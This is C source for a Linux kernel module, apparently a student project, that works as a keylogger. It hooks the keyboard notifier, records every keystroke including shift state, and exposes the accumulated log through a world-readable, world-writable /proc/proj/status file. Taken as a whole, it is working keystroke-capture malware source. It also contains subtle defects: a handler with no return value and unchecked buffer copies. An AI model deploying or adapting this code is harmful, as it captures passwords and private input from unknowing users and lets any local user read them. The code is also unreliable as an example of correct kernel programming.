#define LINUX

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/uaccess.h>
#include <linux/workqueue.h>
#include <linux/mutex.h>
#include <linux/kthread.h>
#include <linux/spinlock.h>
#include <linux/spinlock_types.h>
#include <linux/string.h>
#include <linux/keyboard.h>
#include <linux/slab.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ecortez2");
MODULE_DESCRIPTION("Project");
static struct proc_dir_entry *proc_dir;
static struct proc_dir_entry *proc_entry;

DEFINE_MUTEX(list_lock);
static LIST_HEAD(list_head);
static struct workqueue_struct *my_work;
static struct work_struct *work;
#define BUFSIZE 1024

/*
* Keymap that translate linux keycode number to corresponding ASCII character
* Map used in interrupt for quicker access to translate code
*/
char keymap[128][15] = { "", " esc ", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", 
"=", " bs ", " tab ", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", " enter ",
" lctrl ", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", " lshift ", "\\", "z",
"x", "c", "v", "b", "n", "m", ",", ".", "/", " rshift ", "*", " lalt ", " space ", " capslock ",
" f1 ", " f2 ", " f3 ", " f4 ", " f5 ", " f6 ", " f7 ", " f8 ", " f9 ", " f10 ", " numlock ",
" scrolllock ", " home7 ", " up8 ", " pgup9 ", "-", " left4 ", "5", " rtarrow6 ", "+", " end1 ",
" down2 ", " pgdn3 ", " ins ", " del ", "", "", "", " f11 ", " f12 ", "", "", "", "", "", "",
"", " renter ", " rctrl ", "/", " prtscr ", " ralt ", "", " home ", " up ", " pgup ", " left ",
" right ", " end ", " down ", " pgdn ", " insert ", " del ", "", "", "", "", "", "", "",
" pause "};

/*
* Lengh of above keymap string, used for quicker access than calculating inside interrupt
*/
 int lenmap[128] = { 0, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 4, 5, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 
    1, 7, 7, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 8, 1, 6, 7, 10, 4, 
    4, 4, 4, 4, 4, 4, 4, 4, 5, 9, 12, 7, 5, 7, 1, 7, 1, 10, 1, 6, 7, 7, 5, 5, 0, 0, 0, 5, 5, 0, 0, 0, 0, 
    0, 0, 0, 8, 7, 1, 8, 6, 0, 6, 4, 6, 6, 7, 5, 6, 6, 8, 5, 0, 0, 0, 0, 0, 0, 0, 7};

char readyBuf[BUFSIZE] = {0};
char savedBuf[BUFSIZE] = {0};
int curr_offset;

struct hold_keys {
    struct list_head list;
    char hold[BUFSIZE];
    
} typedef hold_keys;


#define LSHIFT (42)
#define RSHIFT (54)

/*
* Interrupt from keyboard that will read which keyboard key pressed
* Returns as a keycode so need to translate to ASCII value
* Also makes sure to log when the shift key is pressed down and then up to translate the shift vals
*/
int catch_key(struct notifier_block *nblock, unsigned long code, void * _param) {
    struct keyboard_notifier_param * param = _param;
    struct vc_data *vc = param->vc;

    int ret = NOTIFY_OK;
    if (curr_offset > 100){ //smaller value to show if adding to linked list
        memcpy(readyBuf,savedBuf,curr_offset);
        memset(savedBuf,0,curr_offset);
        queue_work(my_work,work);
        curr_offset = 0;
    }
    if (code == KBD_KEYCODE) {

        switch(param->value) {
            case LSHIFT:
                if (param->down) {
                    memcpy(savedBuf + curr_offset," lshiftd ",lenmap[LSHIFT]+1); //one for d addition
                }
                else {
                    memcpy(savedBuf + curr_offset," lshiftu ",lenmap[LSHIFT]+1);
                }
                curr_offset += lenmap[LSHIFT]+1;
            break;
            case RSHIFT:
                if (param->down) {
                    memcpy(savedBuf + curr_offset," rshiftd ",lenmap[RSHIFT]+1); //one for d addition
                }
                else {
                    memcpy(savedBuf + curr_offset," rshiftu ",lenmap[RSHIFT]+1);
                }
                curr_offset += lenmap[RSHIFT]+1;
                break;
            default:
                if (param->down) { //if len is bigger than 1, add space in buffer [blank | keymap ret | blank]
                    memcpy(savedBuf + curr_offset, keymap[param->value], lenmap[param->value]);
                    curr_offset += lenmap[param->value];
                }
        }

    }  
}

/*
* called when script wants to read all the logged data
*/
static ssize_t proc_read (struct file *file, char __user *buffer, size_t count, loff_t *data){
    int copied;
    hold_keys* position;
    static int finished = 0;
    if (finished) { //not best practice but works for now :)
        finished = 0;
        return 0;
    }
    finished = 1;
    char * buff = (char*) kmalloc(count,GFP_KERNEL);
    copied = 0;
    mutex_lock(&list_lock);
    list_for_each_entry(position,&list_head,list){
        copied += sprintf(buff+copied,"%s\n",position->hold);
    }
    mutex_unlock(&list_lock);
    copy_to_user(buffer,buff,copied);
    //simple_read_from_buffer(buffer, count, data, buff, copied);
    kfree(buff);
    return copied;
}

/*
* After done reading, script will "write" to file and tell to dump all the linked list data
* does not matter what gets written since will only know to dump
*/
static ssize_t proc_write (struct file *file, const char __user *buffer, size_t count, loff_t *data){
    hold_keys* position;
    hold_keys* i;
    mutex_lock(&list_lock);
    list_for_each_entry_safe(position,i,&list_head,list){
        list_del_init(&(position->list));
        kfree(position);
    }
    memset(readyBuf,0,BUFSIZE);
    mutex_unlock(&list_lock);
    return count;
}
static struct notifier_block nb = {
  .notifier_call = catch_key
};

static const struct file_operations ffile = {
.owner = THIS_MODULE, 
.read = proc_read,
.write = proc_write,
};

/*
* The Workqueue handler that will copy the data ready to be
* stored inside the kernel linked list
*/
void pack_up( struct work_struct *work){
    hold_keys* new_entry = kmalloc(sizeof(hold_keys), GFP_KERNEL);
    memcpy(new_entry->hold, readyBuf,BUFSIZE);
    memset(readyBuf,0,BUFSIZE);
    mutex_lock(&list_lock);
    list_add_tail( &(new_entry->list), &list_head);
    mutex_unlock(&list_lock);

}
/*
* Called when module is installed using "insmod proj.ko"
* Creates our directory and sets up a workqueue in order to handle tasks
*/
int __init p_init(void)
{
    proc_dir =  proc_mkdir("proj", NULL);
    proc_entry = proc_create("status", 0666, proc_dir, &ffile);
    my_work = create_workqueue("myqueue");
    work = (struct work_struct *)kmalloc(sizeof(struct work_struct), GFP_KERNEL);
    INIT_WORK(work,pack_up);
    register_keyboard_notifier(&nb);
    curr_offset = 0;
    return 0;
}

/*
* Called when module is removed using 'rmmod proj'
*/
void __exit p_exit(void){
    remove_proc_entry("status", proc_dir);
    remove_proc_entry("proj",NULL);
    kfree(work);
    unregister_keyboard_notifier(&nb);

    hold_keys* position;
    hold_keys* i;
    mutex_lock(&list_lock);
    list_for_each_entry_safe(position,i,&list_head,list){
        list_del_init(&(position->list));
        kfree(position);
    }
    mutex_unlock(&list_lock);
}


module_init(p_init);
module_exit(p_exit);